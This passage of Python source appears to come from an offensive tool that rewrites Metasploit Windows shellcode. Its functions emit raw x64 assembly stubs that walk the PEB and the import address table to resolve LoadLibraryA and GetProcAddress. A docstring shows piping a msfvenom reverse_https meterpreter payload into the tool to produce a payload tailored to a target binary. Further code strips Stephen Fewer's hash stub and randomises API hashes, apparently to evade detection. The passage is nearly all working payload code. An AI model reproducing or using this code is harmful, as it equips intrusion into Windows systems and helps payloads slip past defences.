                    "\x68\x47\x65\x74\x50"                              # push 0x50746547
                    "\xe8\x92\xff\xff\xff"                              # call 0x82
                    "\x4c\x01\xda"                                      # add rdx, r11
                    "\x59"                                              # pop rcx
                    "\x59"                                              # pop rcx
                    "\x41\x5e"                                          # pop r14
                    "\x49\x89\xd7"                                      # mov r15, rdx
                    , 'iso-8859-1')
        
        return shellcode
    
    def loaded_gpa_iat_parser_stub(self):
        self.parser_stub = 'ExternGPA'
        
        shellcode = bytes(
            "\xfc"                                              # cld 
            "\x52"                                              # push rdx
            "\x51"                                              # push rcx
            "\x57"                                              # push rdi
            "\x53"                                              # push rbx
            "\x56"                                              # push rsi
            "\x41\x50"                                          # push r8
            "\x41\x51"                                          # push r9
            "\x41\x54"                                          # push r12
            "\x41\x55"                                          # push r13
            "\x41\x56"                                          # push r14
            "\x41\x57"                                          # push r15
            "\x48\x31\xd2"                                      # xor rdx, rdx
            "\x65\x48\x8b\x52\x60"                              # mov rdx, qword ptr gs:[rdx + 0x60]
            "\x48\x8b\x52\x18"                                  # mov rdx, qword ptr [rdx + 0x18]
            "\x48\x8b\x52\x20"                                  # mov rdx, qword ptr [rdx + 0x20]
            "\x48\x8b\x72\x50"                                  # mov rsi, qword ptr [rdx + 0x50]
            "\x6a\x18"                                          # push 0x18
            "\x59"                                              # pop rcx
            "\x4d\x31\xc9"                                      # xor r9, r9
            "\x48\x31\xc0"                                      # xor rax, rax
            "\xac"                                              # lodsb al, byte ptr [rsi]
            "\x3c\x61"                                          # cmp al, 0x61
            "\x7c\x02"                                          # jl 0x37
            "\x2c\x20"                                          # sub al, 0x20
            "\x41\xc1\xc9\x0d"                                  # ror r9d, 0xd
            "\x41\x01\xc1"                                      # add r9d, eax
            "\xe2\xed"                                          # loop 0x2d
            , 'iso-8859-1'
            )
        shellcode += b"\x41\x81\xf9"                                    # cmp r9d, 0xXXXXXXXX
        shellcode += struct.pack("<I", self.impts.DLL_INFO['hash'])    # DLL_HASH
        
        shellcode += bytes("\x4c\x8b\x6a\x20"                                  # mov r13, qword ptr [rdx + 0x20]
            "\x48\x8b\x12"                                      # mov rdx, qword ptr [rdx]
            "\x75\xd3"                                          # jne 0x23
            "\x4c\x89\xea"                                      # mov rdx, r13
            "\x8b\x42\x3c"                                      # mov eax, dword ptr [rdx + 0x3c]
            "\x48\x01\xc2"                                      # add rdx, rax
            "\x8b\xba\x90\x00\x00\x00"                          # mov edi, dword ptr [rdx + 0x90]
            "\x4c\x01\xef"                                      # add rdi, r13
            "\x8b\x57\x0c"                                      # mov edx, dword ptr [rdi + 0xc]
            "\x4c\x01\xea"                                      # add rdx, r13
            , 'iso-8859-1'
            )
        if self.impts.DLL_INFO['importname'] == 'kernel32.dll':
            shellcode += bytes(
            "\x81\x3a\x4b\x45\x52\x4e"                          # cmp dword ptr [rdx], 0x4e52454b
            "\x75\x09"                                          # jne 0x79
            "\x81\x7a\x04\x45\x4c\x33\x32"                      # cmp dword ptr [rdx + 4], 0x32334c45
            "\x74\x06"                                          # je 0x7f
            "\x48\x83\xc7\x14"                                  # add rdi, 0x14
            "\xeb\xe3"                                          # jmp 0x62
            , 'iso-8859-1'
            )
        elif 'api-ms-win-core-libraryloader' in self.impts.DLL_INFO['importname'].lower():
            shellcode += bytes(
                    
            "\x81\x7A\x13\x72\x61\x72\x79"           # CMP DWORD PTR DS:[EDX+13],79726172   ; cmp rary
            "\x75\x09"                                          # jne 0x79
            "\x81\x7A\x22\x2d\x30\x2e\x64"           # CMP DWORD PTR DS:[EDX+18],6564616F   ; cmp -0.d
            "\x74\x06"                                          # je 0x7f
            "\x48\x83\xc7\x14"                                  # add rdi, 0x14
            "\xeb\xe2"                                          # jmp 0x62
            , 'iso-8859-1'
            )
        else:
            sys.stderr.write('[!] What did you just pass to location (-l)? {0}\n'.format(self.impts.importname))
            sys.exit(-1)
        shellcode += bytes(
            "\x57"                                              # push rdi
            "\xeb\x47"                                          # jmp 0xc9
            "\x8b\x57\x10"                                      # mov edx, dword ptr [rdi + 0x10]
            "\x4c\x01\xea"                                      # add rdx, r13
            "\x8b\x37"                                          # mov esi, dword ptr [rdi]
            "\x4c\x01\xee"                                      # add rsi, r13
            "\x48\x89\xd1"                                      # mov rcx, rdx
            "\x48\x81\xc1\x00\x00\xff\x00"                      # add rcx, 0xff0000
            "\x4d\x31\xdb"                                      # xor r11, r11
            "\x8b\x06"                                          # mov eax, dword ptr [rsi]
            "\x4c\x01\xe8"                                      # add rax, r13
            "\x48\x83\xc0\x02"                                  # add rax, 2
            "\x48\x39\xc1"                                      # cmp rcx, rax
            "\x72\x17"                                          # jb 0xbf
            "\x48\x39\xd0"                                      # cmp rax, rdx
            "\x72\x12"                                          # jb 0xbf
            "\x8b\x7c\x24\x08"                                  # mov edi, dword ptr [rsp + 8]
            "\x39\x38"                                          # cmp dword ptr [rax], edi
            "\x75\x0a"                                          # jne 0xbf
            "\x8b\x7c\x24\x10"                                  # mov edi, dword ptr [rsp + 0x10]
            "\x39\x78\x08"                                      # cmp dword ptr [rax + 8], edi
            "\x75\x01"                                          # jne 0xbf
            "\xc3"                                              # ret 
            "\x41\x83\xc3\x04"                                  # add r11d, 4
            "\x48\x83\xc6\x04"                                  # add rsi, 4
            "\xeb\xd1"                                          # jmp 0x9a
            "\x68\x64\x64\x72\x65"                              # push 0x65726464
            "\x68\x47\x65\x74\x50"                              # push 0x50746547
            "\xe8\xaa\xff\xff\xff"                              # call 0x82
            "\x4c\x01\xda"                                      # add rdx, r11
            "\x59"                                              # pop rcx
            "\x59"                                              # pop rcx
            "\x49\x89\xd7"                                      # mov r15, rdx
            "\x48\x31\xd2"                                      # xor rdx, rdx
            "\x65\x48\x8b\x52\x60"                              # mov rdx, qword ptr gs:[rdx + 0x60]
            "\x48\x8b\x52\x18"                                  # mov rdx, qword ptr [rdx + 0x18]
            "\x48\x8b\x52\x20"                                  # mov rdx, qword ptr [rdx + 0x20]
            "\x48\x8b\x72\x50"                                  # mov rsi, qword ptr [rdx + 0x50]
            "\x6a\x18"                                          # push 0x18
            "\x59"                                              # pop rcx
            "\x4d\x31\xc9"                                      # xor r9, r9
            "\x48\x31\xc0"                                      # xor rax, rax
            "\xac"                                              # lodsb al, byte ptr [rsi]
            "\x3c\x61"                                          # cmp al, 0x61
            "\x7c\x02"                                          # jl 0x104
            "\x2c\x20"                                          # sub al, 0x20
            "\x41\xc1\xc9\x0d"                                  # ror r9d, 0xd
            "\x41\x01\xc1"                                      # add r9d, eax
            "\xe2\xed"                                          # loop 0xfa
            "\x49\x81\xf9\x5b\xbc\x4a\x6a"                      # cmp r9, 0x6a4abc5b
            "\x4c\x8b\x6a\x20"                                  # mov r13, qword ptr [rdx + 0x20]
            "\x48\x8b\x12"                                      # mov rdx, qword ptr [rdx]
            "\x75\xd3"                                          # jne 0xf0
            "\x6a\x00"                                          # push 0
            "\x6a\x00"                                          # push 0
            "\xc7\x44\x24\x08\x61\x72\x79\x41"                  # mov dword ptr [rsp + 8], 0x41797261
            "\xc7\x44\x24\x04\x4c\x69\x62\x72"                  # mov dword ptr [rsp + 4], 0x7262694c
            "\xc7\x04\x24\x4c\x6f\x61\x64"                      # mov dword ptr [rsp], 0x64616f4c
            "\x48\x89\xe2"                                      # mov rdx, rsp
            "\x4c\x89\xe9"                                      # mov rcx, r13
            "\x48\x83\xec\x20"                                  # sub rsp, 0x20
            "\x4d\x89\xd5"                                      # mov r13, r10
            "\x41\xff\x17"                                      # call qword ptr [r15]
            "\x50"                                              # push rax
            "\x49\x89\xe6"                                      # mov r14, rsp
            "\x4d\x89\xea"                                      # mov r10, r13
            "\x48\x83\xc4\x40"                                  # add rsp, 0x70
            , 'iso-8859-1'
            )
        
        return shellcode

    def loaded_gpafc_iat_parser_stub(self):
        self.parser_stub = 'ExternGPAFC'
        
        shellcode = bytes(
            "\xfc"                                              # cld 
            "\x52"                                              # push rdx
            "\x51"                                              # push rcx
            "\x57"                                              # push rdi
            "\x53"                                              # push rbx
            "\x56"                                              # push rsi
            "\x41\x50"                                          # push r8
            "\x41\x51"                                          # push r9
            "\x41\x54"                                          # push r12
            "\x41\x55"                                          # push r13
            "\x41\x56"                                          # push r14
            "\x41\x57"                                          # push r15
            "\x48\x31\xd2"                                      # xor rdx, rdx
            "\x65\x48\x8b\x52\x60"                              # mov rdx, qword ptr gs:[rdx + 0x60]
            "\x48\x8b\x52\x18"                                  # mov rdx, qword ptr [rdx + 0x18]
            "\x48\x8b\x52\x20"                                  # mov rdx, qword ptr [rdx + 0x20]
            "\x48\x8b\x72\x50"                                  # mov rsi, qword ptr [rdx + 0x50]
            "\x6a\x18"                                          # push 0x18
            "\x59"                                              # pop rcx
            "\x4d\x31\xc9"                                      # xor r9, r9
            "\x48\x31\xc0"                                      # xor rax, rax
            "\xac"                                              # lodsb al, byte ptr [rsi]
            "\x3c\x61"                                          # cmp al, 0x61
            "\x7c\x02"                                          # jl 0x37
            "\x2c\x20"                                          # sub al, 0x20
            "\x41\xc1\xc9\x0d"                                  # ror r9d, 0xd
            "\x41\x01\xc1"                                      # add r9d, eax
            "\xe2\xed"                                          # loop 0x2d
            , 'iso-8859-1'
            )
        shellcode += b"\x41\x81\xf9"                                    # cmp r9d, 0xXXXXXXXX
        shellcode += struct.pack("<I", self.impts.DLL_INFO['hash'])    # DLL_HASH
        
        shellcode += bytes("\x4c\x8b\x6a\x20"                                  # mov r13, qword ptr [rdx + 0x20]
            "\x48\x8b\x12"                                      # mov rdx, qword ptr [rdx]
            "\x75\xd3"                                          # jne 0x23
            "\x4c\x89\xea"                                      # mov rdx, r13
            "\x8b\x42\x3c"                                      # mov eax, dword ptr [rdx + 0x3c]
            "\x48\x01\xc2"                                      # add rdx, rax
            "\x8b\xba\x90\x00\x00\x00"                          # mov edi, dword ptr [rdx + 0x90]
            "\x4c\x01\xef"                                      # add rdi, r13
            "\x8b\x57\x0c"                                      # mov edx, dword ptr [rdi + 0xc]
            "\x4c\x01\xea"                                      # add rdx, r13
            , 'iso-8859-1'
            )
        if self.impts.DLL_INFO['importname'] == 'kernelbase.dll':
            shellcode += bytes(
            "\x81\x3a\x4b\x45\x52\x4e"                          # cmp dword ptr [rdx], 0x4e52454b
            "\x75\x09"                                          # jne 0x79
            "\x81\x7a\x04\x45\x4c\x42\x41"                      # cmp dword ptr [rdx + 4], 0x32334c45
            "\x74\x06"                                          # je 0x7f
            "\x48\x83\xc7\x14"                                  # add rdi, 0x14
            "\xeb\xe3"                                          # jmp 0x62
            , 'iso-8859-1'
            )
        
        else:
            sys.stderr.write('[!] What did you just pass to location (-l)? {0}\n'.format(self.impts.importname))
            sys.exit(-1)
        shellcode += bytes(
            "\x57"                                              # push rdi
            "\xeb\x47"                                          # jmp 0xc9
            "\x8b\x57\x10"                                      # mov edx, dword ptr [rdi + 0x10]
            "\x4c\x01\xea"                                      # add rdx, r13
            "\x8b\x37"                                          # mov esi, dword ptr [rdi]
            "\x4c\x01\xee"                                      # add rsi, r13
            "\x48\x89\xd1"                                      # mov rcx, rdx
            "\x48\x81\xc1\x00\x00\xff\x00"                      # add rcx, 0xff0000
            "\x4d\x31\xdb"                                      # xor r11, r11
            "\x8b\x06"                                          # mov eax, dword ptr [rsi]
            "\x4c\x01\xe8"                                      # add rax, r13
            "\x48\x83\xc0\x02"                                  # add rax, 2
            "\x48\x39\xc1"                                      # cmp rcx, rax
            "\x72\x17"                                          # jb 0xbf
            "\x48\x39\xd0"                                      # cmp rax, rdx
            "\x72\x12"                                          # jb 0xbf
            "\x8b\x7c\x24\x08"                                  # mov edi, dword ptr [rsp + 8]
            "\x39\x38"                                          # cmp dword ptr [rax], edi
            "\x75\x0a"                                          # jne 0xbf
            "\x8b\x7c\x24\x10"                                  # mov edi, dword ptr [rsp + 0x10]
            "\x39\x78\x08"                                      # cmp dword ptr [rax + 8], edi
            "\x75\x01"                                          # jne 0xbf
            "\xc3"                                              # ret 
            "\x41\x83\xc3\x04"                                  # add r11d, 4
            "\x48\x83\xc6\x04"                                  # add rsi, 4
            "\xeb\xd1"                                          # jmp 0x9a
            "\x68\x64\x64\x72\x65"                              # push 0x65726464
            "\x68\x47\x65\x74\x50"                              # push 0x50746547
            "\xe8\xaa\xff\xff\xff"                              # call 0x82
            "\x4c\x01\xda"                                      # add rdx, r11
            "\x59"                                              # pop rcx
            "\x59"                                              # pop rcx
            "\x49\x89\xd7"                                      # mov r15, rdx
            "\x48\x31\xd2"                                      # xor rdx, rdx
            "\x65\x48\x8b\x52\x60"                              # mov rdx, qword ptr gs:[rdx + 0x60]
            "\x48\x8b\x52\x18"                                  # mov rdx, qword ptr [rdx + 0x18]
            "\x48\x8b\x52\x20"                                  # mov rdx, qword ptr [rdx + 0x20]
            "\x48\x8b\x72\x50"                                  # mov rsi, qword ptr [rdx + 0x50]
            "\x6a\x18"                                          # push 0x18
            "\x59"                                              # pop rcx
            "\x4d\x31\xc9"                                      # xor r9, r9
            "\x48\x31\xc0"                                      # xor rax, rax
            "\xac"                                              # lodsb al, byte ptr [rsi]
            "\x3c\x61"                                          # cmp al, 0x61
            "\x7c\x02"                                          # jl 0x104
            "\x2c\x20"                                          # sub al, 0x20
            "\x41\xc1\xc9\x0d"                                  # ror r9d, 0xd
            "\x41\x01\xc1"                                      # add r9d, eax
            "\xe2\xed"                                          # loop 0xfa
            "\x49\x81\xf9\x5b\xbc\x4a\x6a"                      # cmp r9, 0x6a4abc5b
            "\x4c\x8b\x6a\x20"                                  # mov r13, qword ptr [rdx + 0x20]
            "\x48\x8b\x12"                                      # mov rdx, qword ptr [rdx]
            "\x75\xd3"                                          # jne 0xf0
            "\x6a\x00"                                          # push 0
            "\x6a\x00"                                          # push 0
            "\xc7\x44\x24\x08\x61\x72\x79\x41"                  # mov dword ptr [rsp + 8], 0x41797261
            "\xc7\x44\x24\x04\x4c\x69\x62\x72"                  # mov dword ptr [rsp + 4], 0x7262694c
            "\xc7\x04\x24\x4c\x6f\x61\x64"                      # mov dword ptr [rsp], 0x64616f4c
            "\x4D\x31\xC0"                                      # xor r8, r8
            "\x48\x89\xe2"                                      # mov rdx, rsp
            "\x4c\x89\xe9"                                      # mov rcx, r13
            "\x48\x83\xec\x20"                                  # sub rsp, 0x20
            "\x4d\x89\xd5"                                      # mov r13, r10
            "\x41\xff\x17"                                      # call qword ptr [r15]
            "\x50"                                              # push rax
            "\x49\x89\xe6"                                      # mov r14, rsp
            "\x4d\x89\xea"                                      # mov r10, r13
            "\x48\x83\xc4\x40"                                  # add rsp, 0x70
            , 'iso-8859-1'
            )
        
        return shellcode

    def OffsetGPA(self):
        parser_stub = 'offset'
        importname = 'main_module'
        self.check_imports()
        
        shellcode = bytes(
            "\xfc"                                              # cld 
            "\x52"                                              # push rdx
            "\x51"                                              # push rcx
            "\x57"                                              # push rdi
            "\x53"                                              # push rbx
            "\x56"                                              # push rsi
            "\x41\x50"                                          # push r8
            "\x41\x51"                                          # push r9
            "\x41\x54"                                          # push r12
            "\x41\x55"                                          # push r13
            "\x41\x56"                                          # push r14
            "\x41\x57"                                          # push r15
            "\x48\x31\xd2"                                      # xor rdx, rdx
            "\x65\x48\x8b\x52\x60"                              # mov rdx, qword ptr gs:[rdx + 0x60]
            "\x48\x8b\x52\x10"                                  # mov rdx, qword ptr [rdx + 0x10]
            "\x49\x89\xd5"                                      # mov r13, rdx
            "\x48\xc7\xc3"                                      # mov rbx,
            , 'iso-8859-1'
            )
        shellcode += struct.pack("<I", self.imp_offset)   #  XXXXX
                  
        shellcode +=  bytes("\x4c\x01\xeb"                                      # add rbx, r13
            "\x49\x89\xdf"                                      # mov r15, rbx
            "\x48\x31\xd2"                                      # xor rdx, rdx
            "\x65\x48\x8b\x52\x60"                              # mov rdx, qword ptr gs:[rdx + 0x60]
            "\x48\x8b\x52\x18"                                  # mov rdx, qword ptr [rdx + 0x18]
            "\x48\x8b\x52\x20"                                  # mov rdx, qword ptr [rdx + 0x20]
            "\x48\x8b\x72\x50"                                  # mov rsi, qword ptr [rdx + 0x50]
            "\x6a\x18"                                          # push 0x18
            "\x59"                                              # pop rcx
            "\x4d\x31\xc9"                                      # xor r9, r9
            "\x48\x31\xc0"                                      # xor rax, rax
            "\xac"                                              # lodsb al, byte ptr [rsi]
            "\x3c\x61"                                          # cmp al, 0x61
            "\x7c\x02"                                          # jl 0x53
            "\x2c\x20"                                          # sub al, 0x20
            "\x41\xc1\xc9\x0d"                                  # ror r9d, 0xd
            "\x41\x01\xc1"                                      # add r9d, eax
            "\xe2\xed"                                          # loop 0x49
            "\x49\x81\xf9\x5b\xbc\x4a\x6a"                      # cmp r9, 0x6a4abc5b
            "\x48\x8b\x5a\x20"                                  # mov rbx, qword ptr [rdx + 0x20]
            "\x48\x8b\x12"                                      # mov rdx, qword ptr [rdx]
            "\x75\xd3"                                          # jne 0x3f
            "\x6a\x00"                                          # push 0
            "\x6a\x00"                                          # push 0
            "\xc7\x44\x24\x08\x61\x72\x79\x41"                  # mov dword ptr [rsp + 8], 0x41797261
            "\xc7\x44\x24\x04\x4c\x69\x62\x72"                  # mov dword ptr [rsp + 4], 0x7262694c
            "\xc7\x04\x24\x4c\x6f\x61\x64"                      # mov dword ptr [rsp], 0x64616f4c
            "\x48\x89\xe2"                                      # mov rdx, rsp
            "\x48\x89\xd9"                                      # mov rcx, rbx
            "\x48\x83\xec\x20"                                  # sub rsp, 0x20
            "\x4d\x89\xd5"                                      # mov r13, r10
            "\x41\xff\x17"                                      # call qword ptr [r15]
            "\x50"                                              # push rax
            "\x49\x89\xe6"                                      # mov r14, rsp
            "\x4d\x89\xea"                                      # mov r10, r13
            "\x48\x83\xc4\x38"                                  # add rsp, 0x38

            , 'iso-8859-1')

        return shellcode

    def ExternOffsetGPA(self):
        parser_stub = 'offset'
        importname = 'main_module'
        self.check_imports()
        
        shellcode = bytes(
            "\xfc"                                              # cld 
            "\x52"                                              # push rdx
            "\x51"                                              # push rcx
            "\x57"                                              # push rdi
            "\x53"                                              # push rbx
            "\x56"                                              # push rsi
            "\x41\x50"                                          # push r8
            "\x41\x51"                                          # push r9
            "\x41\x54"                                          # push r12
            "\x41\x55"                                          # push r13
            "\x41\x56"                                          # push r14
            "\x41\x57"                                          # push r15
            "\x48\x31\xd2"                                      # xor rdx, rdx
            "\x65\x48\x8b\x52\x60"                              # mov rdx, qword ptr gs:[rdx + 0x60]
            "\x48\x8b\x52\x18"                                  # mov rdx, qword ptr [rdx + 0x18]
            "\x48\x8b\x52\x20"                                  # mov rdx, qword ptr [rdx + 0x20]
            "\x48\x8b\x72\x50"                                  # mov rsi, qword ptr [rdx + 0x50]
            "\x6a\x18"                                          # push 0x18
            "\x59"                                              # pop rcx
            "\x4d\x31\xc9"                                      # xor r9, r9
            "\x48\x31\xc0"                                      # xor rax, rax
            "\xac"                                              # lodsb al, byte ptr [rsi]
            "\x3c\x61"                                          # cmp al, 0x61
            "\x7c\x02"                                          # jl 0x37
            "\x2c\x20"                                          # sub al, 0x20
            "\x41\xc1\xc9\x0d"                                  # ror r9d, 0xd
            "\x41\x01\xc1"                                      # add r9d, eax
            "\xe2\xed"                                          # loop 0x2d
            , 'iso-8859-1'
            )
        shellcode += b"\x41\x81\xf9"                                    # cmp r9d, 0xXXXXXXXX
        shellcode += struct.pack("<I", self.impts.DLL_INFO['hash'])    # DLL_HASH
        
        shellcode += bytes("\x4c\x8b\x6a\x20"                                  # mov r13, qword ptr [rdx + 0x20]
            "\x48\x8b\x12"                                      # mov rdx, qword ptr [rdx]
            "\x75\xd3"                                          # jne 0x23
            "\x4c\x89\xea"                                      # mov rdx, r13
            "\x48\xc7\xc3"                                      # mov rbx,
            , 'iso-8859-1'
            )
        shellcode += struct.pack("<I", self.imp_offset)   #  XXXXX
                  
        shellcode +=  bytes("\x4c\x01\xeb"                                      # add rbx, r13
            "\x49\x89\xdf"                                      # mov r15, rbx
            "\x48\x31\xd2"                                      # xor rdx, rdx
            "\x65\x48\x8b\x52\x60"                              # mov rdx, qword ptr gs:[rdx + 0x60]
            "\x48\x8b\x52\x18"                                  # mov rdx, qword ptr [rdx + 0x18]
            "\x48\x8b\x52\x20"                                  # mov rdx, qword ptr [rdx + 0x20]
            "\x48\x8b\x72\x50"                                  # mov rsi, qword ptr [rdx + 0x50]
            "\x6a\x18"                                          # push 0x18
            "\x59"                                              # pop rcx
            "\x4d\x31\xc9"                                      # xor r9, r9
            "\x48\x31\xc0"                                      # xor rax, rax
            "\xac"                                              # lodsb al, byte ptr [rsi]
            "\x3c\x61"                                          # cmp al, 0x61
            "\x7c\x02"                                          # jl 0x53
            "\x2c\x20"                                          # sub al, 0x20
            "\x41\xc1\xc9\x0d"                                  # ror r9d, 0xd
            "\x41\x01\xc1"                                      # add r9d, eax
            "\xe2\xed"                                          # loop 0x49
            "\x49\x81\xf9\x5b\xbc\x4a\x6a"                      # cmp r9, 0x6a4abc5b
            "\x48\x8b\x5a\x20"                                  # mov rbx, qword ptr [rdx + 0x20]
            "\x48\x8b\x12"                                      # mov rdx, qword ptr [rdx]
            "\x75\xd3"                                          # jne 0x3f
            "\x6a\x00"                                          # push 0
            "\x6a\x00"                                          # push 0
            "\xc7\x44\x24\x08\x61\x72\x79\x41"                  # mov dword ptr [rsp + 8], 0x41797261
            "\xc7\x44\x24\x04\x4c\x69\x62\x72"                  # mov dword ptr [rsp + 4], 0x7262694c
            "\xc7\x04\x24\x4c\x6f\x61\x64"                      # mov dword ptr [rsp], 0x64616f4c
            "\x48\x89\xe2"                                      # mov rdx, rsp
            "\x48\x89\xd9"                                      # mov rcx, rbx
            "\x48\x83\xec\x20"                                  # sub rsp, 0x20
            "\x4d\x89\xd5"                                      # mov r13, r10
            "\x41\xff\x17"                                      # call qword ptr [r15]
            "\x50"                                              # push rax
            "\x49\x89\xe6"                                      # mov r14, rsp
            "\x4d\x89\xea"                                      # mov r10, r13
            "\x48\x83\xc4\x38"                                  # add rsp, 0x38

            , 'iso-8859-1')

        return shellcode


class x86_windows_metasploit:
    
    '''
    Inputs:
        Any metasploit source windows x86 shellcode/payload that 
        employs Stephen Fewers hash api STUB.
         msfvenom -p windows/meterpreter/reverse_https LHOST=127.0.0.1 PORT=8080 EXIT=Process | 
         ./thisscript.py <optional binary of shellcode> <optional targetbinary> <optional operating system target> <optional dll name as the target> 
         optional targetbinary = by default it will assume LoadLibraryA and GetProcAddress is in the target Import Address Table (IAT). If 
            the target binary is provided it will look at the imported DLLs from the windows OS to determine if their IATs contain 
            LLA/GPA or just GPA and use that.


         Optional target OS: default Win7.


    Outputs:
        A payload tailored to that binary - in c, csharp, binary, bin file outputs.

    '''

    def __init__(self, **kwargs):
        self.__dict__.update(kwargs)
        self.tracker = []
        self.arch = CS_ARCH_X86
        self.mode = ''
        self.syntax = 0
        self.api_hashes = {}
        self.called_apis = []
        self.string_table = ''
        self.tracker_dict = {}
        self.block_order = []
        self.DLL_HASH = 0
        self.lla_hash_dict = {}
        self.gpa_hash_dict = {}
        if self.mode == '32':
            self.mode = CS_MODE_32
        elif self.mode == '64':
            self.mode = CS_MODE_64

        
        if self.OUTPUT == 'stdout':
            # suppress print
            self.VERBOSE = False
        
        # Length 136
        self.fewerapistub_x86 = bytes("\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"
                            "\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
                            "\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52"
                            "\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"
                            "\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b"
                            "\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03"
                            "\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b"
                            "\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
                            "\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb"
                            "\x8d", 'iso-8859-1')

        self.fewerapistub_x64 = bytes("\x41\x51\x41\x50\x52\x51"
                            "\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52"
                            "\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0"
                            "\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed"
                            "\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01", 'iso-8859-1')

        self.fewerapistub_x64_regex = bytes("\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52"
                                            "\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48"
                                            "\x0f\xb7\x4a\x4a(.*?)\xe9.\xff\xff\xff", 
                                            'iso-8859-1'
                                            )

                                            
                                            #"\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41"
                                            #"\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0(.*?)\xe9.\xff\xff\xff", 
                                            #'iso-8859-1')
                              
        # This hash list could be longer

        self.hashes = [  ( 0x006B8029, "ws2_32.dll!WSAStartup" ),
                         ( 0xE0DF0FEA, "ws2_32.dll!WSASocketA" ),
                         ( 0x33BEAC94, 'ws2_32.dll!WSAaccept'),
                         ( 0x6737DBC2, "ws2_32.dll!bind" ),
                         ( 0xFF38E9B7, "ws2_32.dll!listen" ),
                         ( 0xE13BEC74, "ws2_32.dll!accept" ),
                         ( 0x614D6E75, "ws2_32.dll!closesocket" ),
                         ( 0x6174A599, "ws2_32.dll!connect" ),
                         ( 0x5FC8D902, "ws2_32.dll!recv" ),
                         ( 0x5F38EBC2, "ws2_32.dll!send" ),
                         ( 0x5BAE572D, "kernel32.dll!WriteFile" ),
                         ( 0x4FDAF6DA, "kernel32.dll!CreateFileA" ),
                         ( 0x13DD2ED7, "kernel32.dll!DeleteFileA" ),
                         ( 0xE449F330, "kernel32.dll!GetTempPathA" ),
                         ( 0x528796C6, "kernel32.dll!CloseHandle" ),
                         ( 0x863FCC79, "kernel32.dll!CreateProcessA" ),
                         ( 0xE553A458, "kernel32.dll!VirtualAlloc" ),
                         ( 0x300F2F0B, "kernel32.dll!VirtualFree" ),
                         ( 0x0726774C, "kernel32.dll!LoadLibraryA" ),
                         ( 0x7802F749, "kernel32.dll!GetProcAddress" ),
                         ( 0x601D8708, "kernel32.dll!WaitForSingleObject" ),
                         ( 0x876F8B31, "kernel32.dll!WinExec" ),
                         ( 0x9DBD95A6, "kernel32.dll!GetVersion" ),
                         ( 0xEA320EFE, "kernel32.dll!SetUnhandledExceptionFilter" ),
                         ( 0x56A2B5F0, "kernel32.dll!ExitProcess" ),
                         ( 0x0A2A1DE0, "kernel32.dll!ExitThread" ),
                         ( 0x6F721347, "ntdll.dll!RtlExitUserThread" ),
                         ( 0x23E38427, "advapi32.dll!RevertToSelf" ),
                         ( 0xa779563a, "wininet.dll!InternetOpenA"),
                         ( 0xc69f8957, "wininet.dll!InternetConnectA"),
                         ( 0x3B2E55EB, "wininet.dll!HttpOpenRequestA"),
                         ( 0x869E4675, "wininet.dll!InternetSetOptionA"),
                         ( 0x7B18062D, "wininet.dll!HttpSendRequestA"),
                         ( 0xE2899612, "wininet.dll!InternetReadFile"),
              ]    
        

    ###############################
    #Modified from Stephen Fewer's hash.py 
    ###############################

    def ror(self, dword, bits):
        return (dword >> bits | dword << (32 - bits)) & 0xFFFFFFFF

    def unicode(self, string, uppercase=True):
        result = ""
        if uppercase:
            string = string.upper()
        for c in string:
            result += c + "\x00"
        return result

    def hash(self, module, bits=13):
        module_hash = 0
        if len(module) < 12:
            module += "\x00" * (12 - len(module))
        if len(module) > 12:
            module += module[:12]
        for c in self.unicode(module):
            
            module_hash = self.ror(module_hash, bits)
            module_hash += ord(c)
        
        self.DLL_HASH = module_hash

    ###############################
    ###############################    

    def get_hash(self, anumber):
        #sys.stderr.write("API HASH:{0}\n".format(anumber))
        for ahash in self.hashes:
            if hex(ahash[0]) == anumber:
                self.called_apis.append(ahash[1])
                # mangle hash here
                if self.mangle is True:
                    sys.stderr.write('[*] Mangling {0} call hash: '.format(ahash[1]))
                    random_hash = random.randint(1, 4228250625)
                    self.api_hashes[random_hash] = ahash[1]
                    sys.stderr.write('{0}\n'.format(hex(random_hash)))
                    return ahash[1], random_hash # return managed hash here
                else:
                    self.api_hashes[ahash[0]] = ahash[1]
                    return ahash[1], None 
                
        return None, None

    def get_it_in_order(self):
        sys.stderr.write("[*] Length of submitted payload: {0}\n".format(hex(len(self.code))))
        self.replace_string = b''

        if self.fewerapistub_x86 in self.code:
                #strip it
                sys.stderr.write("[*] Stripping Stephen Fewers 32bit hash stub \n")
                self.code = self.code.replace(self.fewerapistub_x86, b'')
                sys.stderr.write("[*] Length of code after stripping: {0}\n".format(len(self.code)))
                self.prestine_code = self.code
                self.mode = CS_MODE_32
        
                
        elif self.fewerapistub_x64 in self.code:
                sys.stderr.write("[*] Stripping Stripping Fewers 64bit hash stub \n")
                #strip off cld, and rsp, 0xfff..0, call XX (yay x64)
                
                #self.code = self.code[10:]
                #now remove SFH stub
                self.code = re.sub(self.fewerapistub_x64_regex, b'', self.code[10:])
                #sys.stderr.write(self.code.hex())
                sys.stderr.write("[*] Length of code after stripping: {0}\n".format(len(self.code)))
                self.prestine_code = self.code
